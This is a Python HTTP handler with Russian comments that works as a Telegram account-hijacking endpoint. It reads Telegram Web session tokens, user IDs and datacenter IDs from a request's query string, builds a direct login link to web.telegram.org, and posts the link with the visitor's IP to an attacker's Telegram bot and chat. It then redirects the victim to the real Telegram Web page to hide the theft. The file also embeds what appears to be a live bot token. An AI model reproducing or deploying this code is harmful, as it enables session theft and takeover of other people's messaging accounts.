from http.server import BaseHTTPRequestHandler
import urllib.parse
import requests
from datetime import datetime

# ⚠️ ПРОВЕРЬ ЭТИ ДВЕ СТРОКИ!
BOT_TOKEN = "8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4"
CHAT_ID = "8220267007"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            print(f"🔥 ЗАПРОС: {self.path}")
            
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            
            token = params.get('tgWebAuthToken', [''])[0]
            user_id = params.get('tgWebAuthUserId', [''])[0]
            dc_id = params.get('tgWebAuthDcId', ['2'])[0]
            
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            
            print(f"📦 ДАННЫЕ: token={token}, user={user_id}, ip={ip}")
            
            # ЕСЛИ ЕСТЬ ТОКЕН - ОТПРАВЛЯЕМ
            if token and user_id:
                login_url = f"https://web.telegram.org/k/#tgWebAuthToken={token}&tgWebAuthUserId={user_id}&tgWebAuthDcId={dc_id}"
                
                message = f"🔥 НОВЫЙ АККАУНТ!\n👤 User: {user_id}\n🔑 Token: {token}\n🌐 DC: {dc_id}\n📱 IP: {ip}\n\n🔗 {login_url}"
                
                # Отправка в Telegram
                r = requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": CHAT_ID, "text": message},
                    timeout=5
                )
                print(f"📤 Telegram ответ: {r.status_code}")
            
            # Редирект
            self.send_response(302)
            self.send_header('Location', 'https://web.telegram.org/k/')
            self.end_headers()
            
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            self.send_response(302)
            self.send_header('Location', 'https://web.telegram.org/k/')
            self.end_headers()
    
    def do_POST(self):
        self.do_GET()
